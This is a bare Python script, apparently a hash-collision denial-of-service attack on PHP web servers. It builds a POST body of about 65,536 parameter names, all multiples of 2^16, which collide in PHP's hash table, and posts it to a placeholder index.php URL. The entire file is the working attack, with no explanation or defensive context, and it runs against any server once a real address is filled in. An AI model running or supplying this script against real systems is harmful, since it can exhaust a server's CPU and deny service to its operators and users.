#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'xilei'


from urllib import request
import math


def build_data(length):
    data = []
    maxkey = (length-1)*length
    key = 0
    while key <= maxkey:
        data.append(str(int(key)))
        key = key + length
    return '=0&'.join(data).encode('utf-8')


def post(url, length=math.pow(2, 16)):
    req = request.Request(url, build_data(length))
    opener = request.build_opener()
    return opener.open(req).read()


if __name__ == "__main__":
    print(post('http://www.xxxx.com/index.php'))
    pass
